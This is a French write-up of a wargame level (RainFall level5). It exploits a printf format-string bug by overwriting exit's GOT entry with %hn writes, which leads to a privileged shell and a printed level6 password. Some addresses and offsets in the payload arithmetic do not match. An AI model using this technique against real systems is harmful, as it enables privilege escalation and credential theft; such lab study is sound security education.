Nous avons un binaire **./level5**
COmmencons par voir les appels aux fonctions:
```sh
level5@RainFall:~$ ltrace ./level5
__libc_start_main(0x8048504, 1, 0xbffff7f4, 0x8048520, 0x8048590 <unfinished ...>
fgets(%p%p%p%p%p%p%p%p%p%p%p%p%p%p
"%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n", 512, 0xb7fd1ac0)      = 0xbffff540
printf("%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n", 0x200, 0xb7fd1ac0, 0xb7ff37d0, 0x70257025, 0x70257025, 0x70257025, 0x70257025, 0x70257025, 0x70257025, 0x70257025, 0xa, (nil), 0xb7fde000, 0xb7fff53c0x2000xb7fd1ac00xb7ff37d00x702570250x702570250x702570250x702570250x702570250x702570250x702570250xa(nil)0xb7fde0000xb7fff53c
) = 124
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
level5 fini par un exit visiblement avant d'arriver à la fin du programme. On remarque qu'il y a un appel à printf et que printf est vulnérable à l'exploit de format, cherchons l'index: 
```sh
level5@RainFall:~$ ./level5
aaaa%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
aaaa0x2000xb7fd1ac00xb7ff37d00x616161610x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250xbfff000a0x400xb80(nil)0xb7fde7140x98
```
C'est a l'index 4 que nous retrouvons notre chaîne "aaaa" : 0x61616161.
Passons au désassemblage:

```asm
level5@RainFall:~$ objdump ./level5 -d -M intel

./level5:     file format elf32-i386

Disassembly of section .init:
...
080483d0 <exit@plt>:
 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
 80483d6:       68 28 00 00 00          push   $0x28
 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>
 ...
080484a4 <o>:
 80484a4:       55                      push   ebp
 80484a5:       89 e5                   mov    ebp,esp
 80484a7:       83 ec 18                sub    esp,0x18
 80484aa:       c7 04 24 f0 85 04 08    mov    DWORD PTR [esp],0x80485f0
 80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
 80484b6:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:       55                      push   ebp
 80484c3:       89 e5                   mov    ebp,esp
 80484c5:       81 ec 18 02 00 00       sub    esp,0x218
 80484cb:       a1 48 98 04 08          mov    eax,ds:0x8049848
 80484d0:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484d4:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 80484db:       00
 80484dc:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484e2:       89 04 24                mov    DWORD PTR [esp],eax
 80484e5:       e8 b6 fe ff ff          call   80483a0 <fgets@plt>
 80484ea:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484f0:       89 04 24                mov    DWORD PTR [esp],eax
 80484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
 80484f8:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt>

08048504 <main>:
 8048504:       55                      push   ebp
 8048505:       89 e5                   mov    ebp,esp
 8048507:       83 e4 f0                and    esp,0xfffffff0
 804850a:       e8 b3 ff ff ff          call   80484c2 <n>
 804850f:       c9                      leave
 8048510:       c3                      ret
 8048511:       90                      nop
...
```
Plusieurs choses:
- **main** appel **n** qui appelle **fgets** avec un buffer de 512 octets puis **printf**
- **n** appelle **exit**
- il y a une fonction **o** qui appelle system chargé avec le buffer "/bin/sh" -> c'est évidemment notre cible
```sh
level5@RainFall:~$ gdb -q ./level5
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) x/s 0x80485f0
0x80485f0:       "/bin/sh"
```
- **o** n'a pas de protection particulière conditionnant son accès, un jump dans gdb permet d'y accéder, mais il nous faut les droits level6

Il faut donc contourner l'appel a **exit** de **n** pour appeler **o** à la place.
On a vu au précédant hack qu'avec le format **%n** il était possible d'écrire des valeurs à une adresse. Il faudrait donc écraser l'adresse d'**exit** pour la remplacer par celle de **o**.
L'adresse de **o** est **0x080484a4**, celle d'**exit** est **0x8049838**.
L'adresse de o représente un nombre gigantesque pour être écrit par printf en nombre de caractère, potentiellement cela peut crasher. Nous allons donc écrire l'adresse en deux fois à l'aide de 2 * 2 octets au lieu de 4 octets d'un coup en séparant lower bytes et higher bytes (LOB et HOB) à l'aide de %hn qui n'écrit que le LOB de l'int pointé par %n:

>si HOB < LOB
>[adresse + 2][adresse]%[HOB - 8]x%[offset]$hn%[LOB - HOB]x%[offset + 1]

>si HOB > LOB
>[address + 2][address]%[LOB - 8]x%[offset + 1]$hn%[HOB - LOB]x%[offset]

ici: 0x0804 < 0x84a4 donc options 1
En little endian nous allons commencer à écrire 2 octets dans la dernière partie de l'adresse de exit puis 2 octets dans la première.
Nous convertissons 0x0804 et 0x84a4 en décimal 2056 et 33956 il faut enlever 8 octets pour les 2 adresses puis enlever le nombres d'octets déjà écrit (33956 - 2052) ce qui donne 2044 et 31904, donc on a:
```sh
level5@RainFall:~$ python -c 'print "\x40\x98\x04\x08\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/payload
level5@RainFall:~$ cat /tmp/payload - | ./level5

                                                                              b7fd1ac0
```
On dirai que nous avons un shell, essayons **id**:
```sh
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
Flag!
